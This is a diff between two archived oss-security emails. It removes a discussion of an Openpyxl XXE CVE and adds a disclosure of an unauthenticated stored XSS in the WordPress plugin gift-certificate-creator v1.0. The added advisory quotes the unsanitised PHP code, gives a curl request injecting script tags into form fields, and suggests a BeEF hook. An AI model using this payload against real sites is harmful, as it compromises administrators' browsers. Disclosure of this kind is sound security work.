@@ -1,60 +1,63 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/14/1
-Message-ID: <20170214012459.GA11244@sin.redhat.com>
-Date: Tue, 14 Feb 2017 11:55:00 +1030
-From: Doran Moppert <dmoppert@...hat.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: Re: CVE request: XXE in Openpyxl
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/02/6
+Message-id: <1FF6A1D9-4F53-40F3-A9E5-0E7AA03F82A6@me.com>
+Date: Fri, 02 Jun 2017 13:45:49 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Unauthenticated Stored XSS Vulnerability in Wordpress plugin gift-certificate-creator v1.0
 Content-Type: text/plain; charset=utf-8
 
-On Feb 13 2017, Sébastien Delafond wrote:
-> On 2017-02-07, Doran Moppert <dmoppert@...hat.com> wrote:
-> > This is yet another instance of CVE-2016-9318.  As already observed
-> > on the Debian tracker, disabling entity resolution altogether is
-> > probably going to make openpyxl fail on well-formed Excel documents
-> > using standard entities such as &lt;.
-> 
-> we do not see this issue being technically the same thing as
-> CVE-2016-9318. openpyxl shouldn't need to resolve *external* XML
-> entities, and the initial reporter of the Debian bug tested that the
-> upstream patch doesn't break reglar entities like "&lt"; and
-> "&gt;". What do you think ?
-
-My mistake - thanks for bringing this up!
-
-It appears that resolve_entities=False (ie. options &= ~XML_PARSE_NOENT)
-does *not* affect the expansion of predefined entities or character
-entities.  See [1], [2] and parser.c + HTMLparser.c in libxml source.
-
-1: https://www.xml.com/pub/a/98/08/xmlqna1.html
-2: https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references
-
-These flags *do* control the expansion of internal entities, but I
-expect that most common protocols and file formats should not rely on
-those - including Excel.  As long as openpyxl has no need to resolve
-internal entities, nor perform DTD validation, CVE-2016-9318 is not
-relevant and the proposed patch looks correct.
+Title: Unauthenticated Stored XSS Vulnerability in Wordpress plugin gift-certificate-creator v1.0
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-05-15
+CVE-ID:[CVE-2017-1002017]
+Download Site: https://wordpress.org/plugins/gift-certificate-creator/
+Vendor: Bob Cares https://bobcares.com/
+Vendor Notified: 2017-05-17
+Vendor Contact: plugins@...dpress.org
+Advisory: http://www.vapidlabs.com/advisory.php?v=191
+Description: Gift Certificate Creator WordPress plugin allows you to manage gift certificates on your website. In a convenient front-end UI provided by this plugin, your site visitors can enter the amount and user details. On form submission, the user details will be sent to the administrator. Also, the administrator can view the list of all the certificate requests.
+Vulnerability:
+Publically accessible pages that are using the shortcode ‘[gift_certificate_form]’ allow any user to add gift certificate entries into the database.  These entries are listed by the Wordpress administrator when visiting the plugin admin page.  This action is performed by gc-list.php which doesn't sanitize the entries before
+displaying them.   This allows malicious javascript to be injected into the WordPress database. 
 
 
-So yes, the original CVE request was valid and should go ahead:
+In file giftcertificates.php 
+141:    if ($_REQUEST['action'] == 'Submit') {
+144:        //if (!empty($_REQUEST['cert_amount']) && !empty($_REQUEST['cc_number']) && !empty($_REQUEST['cc_sec_code'])) {
+145:   		if (!empty($_REQUEST['cert_amount']) && !empty($_REQUEST['cc_sec_code'])) {
+147:            $gcmObj->createNewGCM($_REQUEST);
+149:            writeLog(" amount ".$_REQUEST['cert_amount']." and email ".$_REQUEST['cc_sec_code']." are posted successfully", basename(__LINE__), basename(__FILE__));
+152:            $gcmObj->sendGCMReportEmail(GC_MAIL_TO, GC_MAIL_FROM, GC_MAIL_SUBJECT, $_REQUEST);
+153:            $_REQUEST = array();
+212-    <form method="get" name="gc_form" action="">
+213-        <table class='gc_form'>
+214-            <tr>
+215-                <th>Certificate Amount:</th>
+216:                <td><input type="text" name="cert_amount" value="<?php echo $_REQUEST['cert_amount']; ?>" placeholder ="$"></td>
+217-            </tr>
+218-            <tr>
+219-                <th>Your Name:</th>
+220:                <td><input type="text" name="user_name" value="<?php echo $_REQUEST['user_name']; ?>"> (optional)</td>
+221-            </tr>
+222-            <tr>
+223-                <th>Recipient Name:</th>
+224:                <td><input type="text" name="receip_name" value="<?php echo $_REQUEST['receip_name']; ?>"> (optional)</td>
+225-            </tr>
+226-            <tr>
+227-                <th>Recipient Email:</th>
+228:                <td><input type="text" name="cc_sec_code" value="<?php echo $_REQUEST['cc_sec_code']; ?>"></td>
+229-            </tr>
+230-            <tr>
+231-                <th>Recipient Address:</th>
+232:                <td><textarea name="receip_address" value="<?php echo $_REQUEST['receip_address']; ?>"></textarea>
+233-            </tr>
+234-            <tr>
+235-                <td colspan="2" style="text-align: center;"><input type="submit" value="Submit" name="action"></td>
+236-            </tr>
+237-        </table>
 
-> the Debian Security Team would like to request a CVE for an XML XEE
-> discovered in Openpyxl by Marcin Ulikowski from F-Secure; Openpyxl
-> resolves external entities by default:
-> 
->   https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=854442
->   https://bitbucket.org/openpyxl/openpyxl/commits/3b4905f428e1
+Exploit Code:
+	• $ curl http://example/index.php/2017/05/16/gift-certificates/?cert_amount=50&user_name=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&receip_name=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&cc_sec_code=no%40me.net&receip_address=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&action=Submit
 
-Also: https://bitbucket.org/openpyxl/openpyxl/issues/749
-
-
-Sorry about muddying the water with misunderstanding(s).  The tricky
-part of CVE-2016-9318 seems to be particular requirements of components
-like xmlsec that want internal entity resolution without XXE, or DTD
-validation without exposing the whole filesystem.
-
--- 
-Doran Moppert
-Red Hat Product Security
-
-Content of type "application/pgp-signature" skipped
+Notes: Inject a BeEF hook even.
